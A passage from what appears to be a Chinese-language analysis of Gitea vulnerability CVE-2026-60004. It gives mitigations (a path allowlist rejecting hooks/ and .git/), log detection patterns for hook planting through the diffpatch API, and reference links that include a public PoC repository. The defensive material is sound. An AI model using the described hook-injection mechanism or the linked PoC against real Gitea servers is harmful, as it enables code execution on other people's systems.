<code>hooks/</code>。</p></li><li><p>入口：在 diffpatch handler 前加路径白名单，拒绝 <code>hooks/</code>、<code>.git/</code> 和保留目录；再对同一仓库的重复补丁做去重或告警。</p></li><li><p>日志：搜 <code>diffpatch</code> 的 201 后紧跟 <code>git apply ... -3</code>、临时目录里的 <code>upload.git*/hooks/post-index-change</code>、临时仓库 <code>core.bare=true</code>；1.27.1 搜 <code>does not match index</code> 和 <code>patch does not apply</code>。</p></li></ol><p>检查清单就一句话：版本不低于 1.27.1，临时仓库不是 bare，补丁路径里不许出现 <code>hooks/</code>。</p><h2 id=\"sec-33\">参考链接</h2><p>CVE 记录：</p><ul><li><p>NVD：<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-60004\">https://nvd.nist.gov/vuln/detail/CVE-2026-60004</a></p></li><li><p>CVE.org：<a href=\"https://www.cve.org/CVERecord?id=CVE-2026-60004\">https://www.cve.org/CVERecord?id=CVE-2026-60004</a></p></li></ul><p>厂商公告：</p><ul><li><p>Gitea 1.27.1 发布说明：<a href=\"https://blog.gitea.com/release-of-1.27.1/\">https://blog.gitea.com/release-of-1.27.1/</a></p></li><li><p>GHSA-rcr6-4jqh-j84m：<a href=\"https://github.com/go-gitea/gitea/security/advisories/GHSA-rcr6-4jqh-j84m\">https://github.com/go-gitea/gitea/security/advisories/GHSA-rcr6-4jqh-j84m</a></p></li></ul><p>公开 PoC：</p><ul><li><p>0xBlackash/CVE-2026-60004：<a href=\"https://github.com/0xBlackash/CVE-2026-60004\">https://github.com/0xBlackash/CVE-2026-60004</a></p></li><li><p>CVE-2026-60004.py：<a href=\"https://github.com/0xBlackash/CVE-2026-60004/blob/main/CVE-2026-60004.py\">https://github.com/0xBlackash/CVE-2026-60004/blob/main/CVE-2026-60004.py</a></p></li></ul><p>涉及源码（按 v1.27.0 / v1.27.1 定位）：</p><ul><li><p>routers/api/v1/repo/patch.go：<a href=\"https://github.com/go-gitea/gitea/blob/v1.27.0/routers/api/v1/repo/patch.go\">https://github.com/go-gitea/gitea/blob/v1.27.0/routers/api/v1/repo/patch.go</a></p></li><li><p>services/repository/files/patch.go（v1.27.0）：<a href=\"https://github.com/go-gitea/gitea/blob/v1.27.0/services/repository/files/patch.go\">https://github.com/go-gitea/gitea/blob/v1.27.0/services/repository/files/patch.go</a></p></li><li><p>services/repository/files/patch.go（v1.27.1）：<a href=\"https://github.com/go-gitea/gitea/blob/v1.27.1/services/repository/files/patch.go\">https://github.com/go-gitea/gitea/blob/v1.27.1/services/repository/files/patch.go</a></p></li><li><p>services/repository/files/temp_repo.go：<a href=\"https://github.com/go-gitea/gitea/blob/v1.27.0/services/repository/files/temp_repo.go\">https://github.com/go-gitea/gitea/blob/v1.27.0/services/repository/files/temp_repo.go</a></p></li><li><p>modules/git/repo.go：<a href=\"https://github.com/go-gitea/gitea/blob/v1.27.0/modules/git/repo.go\">https://github.com/go-gitea/gitea/blob/v1.27.0/modules/git/repo.go</a></p></li></ul>","original","zhKind","complete","复现","漏洞分析","利用链","补丁","CISA","NVD","https://xz.aliyun.com/news/93333","先知社区",{"_196":197,"_198":-5},"changelogVersion","2026-10-01T08:00","release"]
